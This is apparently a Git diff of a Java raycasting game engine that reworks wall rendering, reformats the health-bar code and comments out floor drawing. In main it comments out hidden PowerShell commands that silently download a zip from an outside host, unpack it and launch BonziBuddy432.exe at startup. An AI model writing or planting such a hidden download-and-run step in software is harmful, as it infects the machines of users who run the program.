@@ -99,7 +99,6 @@ public class Engine extends JPanel {
 
 	}
 
-	private static final ArrayList<Integer> parallelizedX = new ArrayList<>();
 
 	private static final int map[][] = Room.createRoom();
 	private static final int mapLen = map.length;
@@ -155,7 +154,7 @@ public class Engine extends JPanel {
 			g.setColor(Color.black);
 			g.fillRect(0, 0, 800, 800);
 			move();
-			drawFloor();
+			// drawFloor();
 			renderWalls();
 			for (int i = transparencyLimit - 1; i >= 0; i--) {
 				Future<?> futures[] = new Future<?>[800];
@@ -189,24 +188,25 @@ public class Engine extends JPanel {
 			ImageIcon barColour;
 
 			int hpWidth = 400, hpHeight = 50, hpX = 100, hpY = 720;
-			
-			if(Player.getHealth() > 20) {
+
+			if (Player.getHealth() > 20) {
 				barColour = new ImageIcon("assets/images/textures/greenBar.png");
 				g.setColor(Color.green);
-				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15, (int)(Player.getHealth() * (hpWidth/100)) - 30, hpHeight - 30, null);
-			}
-			else {
+				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15, (int) (Player.getHealth() * (hpWidth / 100)) - 30,
+						hpHeight - 30, null);
+			} else {
 				barColour = new ImageIcon("assets/images/textures/redBar.png");
 				g.setColor(Color.red);
-				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15, (int)(Player.getHealth() * (hpWidth/100) + 15) - 30, hpHeight - 30, null);
+				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15,
+						(int) (Player.getHealth() * (hpWidth / 100) + 15) - 30, hpHeight - 30, null);
 			}
-			
+
 			barColour = new ImageIcon("assets/images/textures/healthBar.png");
 			g.drawImage(barColour.getImage(), hpX, hpY, hpWidth, hpHeight, null);
 
-			g.drawString(((int)(Player.getHealth()) + "%"), hpX - 40, hpY + 30);
+			g.drawString(((int) (Player.getHealth()) + "%"), hpX - 40, hpY + 30);
 
-			if(Player.getHealth() <= 0) {
+			if (Player.getHealth() <= 0) {
 				g.fillRect(0, 0, 1200, 1200);
 			}
 		}
@@ -219,91 +219,89 @@ public class Engine extends JPanel {
 
 	public void renderWalls() {
 
-		parallelizedX.parallelStream().forEach(
-				x -> {
-					double c = x / 400.0 - 1;
-					double raydirX = dirX + c * planeX;
-					double raydirY = dirY + c * planeY;
-					double dx = (raydirX == 0) ? 1e20 : Math.abs(1 / raydirX);
-					double dy = (raydirY == 0) ? 1e20 : Math.abs(1 / raydirY);
+		for (int x = 0; x < 800; x++) {
+			double c = x / 400.0 - 1;
+			double raydirX = dirX + c * planeX;
+			double raydirY = dirY + c * planeY;
+			double dx = (raydirX == 0) ? 1e20 : Math.abs(1 / raydirX);
+			double dy = (raydirY == 0) ? 1e20 : Math.abs(1 / raydirY);
 
-					int side = 0;
+			int side = 0;
 
-					int mapX = (int) posX;
-					int mapY = (int) posY;
+			int mapX = (int) posX;
+			int mapY = (int) posY;
 
-					double lenX;
-					double lenY;
-					double stepX;
-					double stepY;
+			double lenX;
+			double lenY;
+			double stepX;
+			double stepY;
 
-					if (raydirX < 0) {
-						lenX = (posX - mapX) * dx;
-						stepX = -1;
+			if (raydirX < 0) {
+				lenX = (posX - mapX) * dx;
+				stepX = -1;
+			} else {
+				lenX = (1 - posX + mapX) * dx;
+				stepX = 1;
+			}
+			if (raydirY < 0) {
+				lenY = (posY - mapY) * dy;
+				stepY = -1;
+			} else {
+				lenY = (1 + mapY - posY) * dy;
+				stepY = 1;
+			}
+
+			double wallcoord;
+			double dist;
+
+			int hits = 0;
+			for (int i = 0; i < 200; i++) {
+				if ((mapX < 0 || mapX >= mapLen) || (mapY < 0 || mapY >= mapLen))
+					break;
+				if (map[mapX][mapY] != 0) {
+					if (side == 0) {
+						dist = (lenX - dx);
+						double texturedist = dist * raydirY + posY;
+						wallcoord = texturedist - Math.floor(texturedist);
 					} else {
-						lenX = (1 - posX + mapX) * dx;
-						stepX = 1;
-					}
-					if (raydirY < 0) {
-						lenY = (posY - mapY) * dy;
-						stepY = -1;
-					} else {
-						lenY = (1 + mapY - posY) * dy;
-						stepY = 1;
+						dist = (lenY - dy);
+						double texturedist = dist * raydirX + posX;
+						wallcoord = texturedist - Math.floor(texturedist);
 					}
 
-					double wallcoord;
-					double dist;
+					int lineHeight = (int) (800 / (dist));
 
-					int hits = 0;
-					for (int i = 0; i < 200; i++) {
-						if ((mapX < 0 || mapX >= mapLen) || (mapY < 0 || mapY >= mapLen))
-							break;
-						if (map[mapX][mapY] != 0) {
-							if (side == 0) {
-								dist = (lenX - dx);
-								double texturedist = dist * raydirY + posY;
-								wallcoord = texturedist - Math.floor(texturedist);
-							} else {
-								dist = (lenY - dy);
-								double texturedist = dist * raydirX + posX;
-								wallcoord = texturedist - Math.floor(texturedist);
-							}
+					int screencoords[] = { (int) x, (int) (400 - lineHeight / 2), (int) x + 1,
+							(int) (400 + lineHeight / 2) };
+					int texturecoords[] = { (int) (wallcoord * 300), 0, (int) (wallcoord * 300) + 1, 299 };
 
-							int lineHeight = (int) (800 / (dist));
-
-							int screencoords[] = { (int) x, (int) (400 - lineHeight / 2), (int) x + 1,
-									(int) (400 + lineHeight / 2) };
-							int texturecoords[] = { (int) (wallcoord * 300), 0, (int) (wallcoord * 300) + 1, 299 };
-
-							hits++;
-							boolean b = false;
-							if (hits >= transparencyLimit) {
-								hits = transparencyLimit;
-								b = true;
-							}
-							rects[800 * (transparencyLimit - hits) + x] = new rect(screencoords, texturecoords,
-									walltexture, this);
-							if (b)
-								break;
-						}
-						if (lenY < lenX) {
-							mapY += stepY;
-							lenY += dy;
-							side = 1;
-						} else {
-							mapX += stepX;
-							lenX += dx;
-							side = 0;
-						}
+					hits++;
+					boolean b = false;
+					if (hits >= transparencyLimit) {
+						hits = transparencyLimit;
+						b = true;
 					}
-				});
+					rects[800 * (transparencyLimit - hits) + x] = new rect(screencoords, texturecoords,
+							walltexture, this);
+					if (b)
+						break;
+				}
+				if (lenY < lenX) {
+					mapY += stepY;
+					lenY += dy;
+					side = 1;
+				} else {
+					mapX += stepX;
+					lenX += dx;
+					side = 0;
+				}
+			}
+		}
 
 	}
 
 	public void drawFloor() {
-		// parallelizedX.parallelStream().forEach(
-		// x -> {
+
 		DataBufferInt imageBuffer = (DataBufferInt) image.getRaster().getDataBuffer();
 		DataBufferInt textureBuffer = (DataBufferInt) floortexture.getRaster().getDataBuffer();
 
@@ -311,6 +309,8 @@ public class Engine extends JPanel {
 		int textureData[] = textureBuffer.getData();
 
 		for (int x = 0; x < 800; x++) {
+			// parallelizedX.forEach(
+			// x -> {
 			double c = x / 400.0 - 1;
 			double raydirX = dirX + c * planeX;
 			double raydirY = dirY + c * planeY;
@@ -352,7 +352,7 @@ public class Engine extends JPanel {
 			posX += planeX * moveSpeed;
 			posY += planeY * moveSpeed;
 		}
-		if(keys[6]) {
+		if (keys[6]) {
 			Player.changeHealth(-1);
 		}
 
@@ -379,17 +379,20 @@ public class Engine extends JPanel {
 	}
 
 	// main method with standard graphics code
-	public static void main(String[] args) throws IOException, InterruptedException{
-		System.setProperty("sun.java2d.opengl", "true");
+	public static void main(String[] args) throws IOException, InterruptedException {
+		// System.setProperty("sun.java2d.opengl", "false");
 		JFrame frame = new JFrame("Rishi x Avaline");
-		String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl' -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
-		String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar' -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
-		String s3[] = {"powershell", "-Command \"Start-Process -FilePath 'BonziBuddy432.exe'\""};
-		Process p1 = Runtime.getRuntime().exec(s);
-		p1.waitFor();
-		Process p2 = Runtime.getRuntime().exec(s2);
-		p2.waitFor();
-		Runtime.getRuntime().exec(s3);
+		// String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl'
+		// -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
+		// String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar'
+		// -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
+		// String s3[] = {"powershell", "-Command \"Start-Process -FilePath
+		// 'BonziBuddy432.exe'\""};
+		// Process p1 = Runtime.getRuntime().exec(s);
+		// p1.waitFor();
+		// Process p2 = Runtime.getRuntime().exec(s2);
+		// p2.waitFor();
+		// Runtime.getRuntime().exec(s3);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
 		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
